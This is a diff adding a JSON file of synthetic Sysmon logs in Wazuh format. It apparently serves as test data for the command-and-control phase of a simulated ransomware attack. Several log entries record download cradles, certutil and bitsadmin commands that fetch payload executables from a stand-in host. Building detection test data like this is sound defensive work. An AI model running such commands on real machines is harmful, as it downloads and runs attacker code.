@@ -1,0 +1,128 @@
+{
+  "_metadata": {
+    "engagement": "ransomware",
+    "phase": "command-and-control",
+    "phase_number": 9,
+    "description": "Command And Control phase of Ransomware - example-corp",
+    "techniques": [
+      "T1105"
+    ],
+    "timespan": "T+8:11:30 to T+8:14:30",
+    "attacker_logic": "Attacker executes command-and-control techniques",
+    "format": "wazuh-native",
+    "format_version": "2.0"
+  },
+  "attacker_profile": {
+    "c2_server": "185.141.27.98",
+    "initial_target": "WS01.corp.local",
+    "compromised_user": "CORP\\jsmith"
+  },
+  "logs": [
+    {
+      "_comment": "Certutil download cradle (LOLBin)",
+      "sequence": 1,
+      "relative_time": "T+8:11:30",
+      "timestamp": "2026-01-30T16:11:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:40:38.625",
+            "ProcessGuid": "{C257A465-WS01-0009-CE7380A7EC94}",
+            "ProcessId": "1991",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil -urlcache -split -f http://update-cdn.example.com/payload.exe C:\\Users\\Public\\update.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\mjones",
+            "IntegrityLevel": "High",
+            "ParentProcessGuid": "{C257A465-WS01-0008-5D4E815528B7}",
+            "ParentProcessId": "1843",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:11:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "command-and-control"
+      }
+    },
+    {
+      "_comment": "Certutil network connection",
+      "sequence": 2,
+      "relative_time": "T+8:12:30",
+      "timestamp": "2026-01-30T16:12:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 3,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:40:38.625",
+            "ProcessGuid": "{C257A465-WS01-0009-CE7380A7EC94}",
+            "ProcessId": "1991",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "User": "EXAMPLE\\mjones",
+            "Protocol": "tcp",
+            "Initiated": "true",
+            "SourceIp": "10.1.1.50",
+            "SourcePort": "60719",
+            "DestinationIp": "203.0.113.50",
+            "DestinationHostname": "update-cdn.example.com",
+            "DestinationPort": "80"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:12:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "command-and-control"
+      }
+    },
+    {
+      "_comment": "Bitsadmin download (LOLBin)",
+      "sequence": 3,
+      "relative_time": "T+8:14:00",
+      "timestamp": "2026-01-30T16:14:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:40:47.365",
+            "ProcessGuid": "{C257A465-WS01-0010-49ECBB711821}",
+            "ProcessId": "2055",
+            "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+            "CommandLine": "bitsadmin /transfer job /download /priority high http://update-cdn.example.com/stage2.exe C:\\Users\\Public\\stage2.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "ParentProcessGuid": "{C257A465-WS01-0009-CE7380A7EC94}",
+            "ParentProcessId": "1991",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:14:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "command-and-control"
+      }
+    }
+  ]
+}
